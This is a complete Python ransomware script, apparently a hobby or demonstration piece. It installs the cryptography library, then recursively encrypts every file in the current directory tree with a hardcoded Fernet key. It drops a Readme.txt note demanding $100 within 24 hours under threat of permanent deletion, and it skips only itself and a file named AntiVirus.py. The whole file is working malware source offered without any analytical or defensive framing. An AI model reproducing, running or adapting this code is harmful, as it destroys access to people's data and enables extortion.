from genericpath import isfile
import os
import subprocess
import sys

def install(package) -> None:
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

install("cryptography")
from cryptography.fernet import Fernet , InvalidToken

key='7SpexdsyHOkKtPe9q7JCe384UV6E2MMjcxFgeyJZUzQ='
warning = "HUI HUI HUI !!!!! YOUR COMPUTER IS HACKED .PAY ME 100$ with in 24 Hours to retrive your data otherwise it will be deletd permenetly"


def encryt(file) -> None:
    with open(file,"rb") as thefile:
        content= thefile.read()
        encrepted_content = Fernet(key).encrypt(content)
    with open(file,"wb") as thefile:
        thefile.write(encrepted_content)

def create_warning_file() -> None:
    f = open("Readme.txt", "w")
    f.write(warning)
    f.close()


def Recursion() -> None:
    files = []
    folder = []



    for file in os.listdir():
        if file == "ransome.py" or file == "AntiVirus.py":
            continue
        if os.path.isfile(file):
            encryt(file)
            create_warning_file()
        else:
            currentpath = os.getcwd()
            newPath = currentpath + "\\"+file
            folder.append(newPath)
            
    while(folder):
        currentPath_new = os.getcwd()
        os.chdir(folder.pop(0))
        Recursion()
        os.chdir(currentPath_new)



Recursion()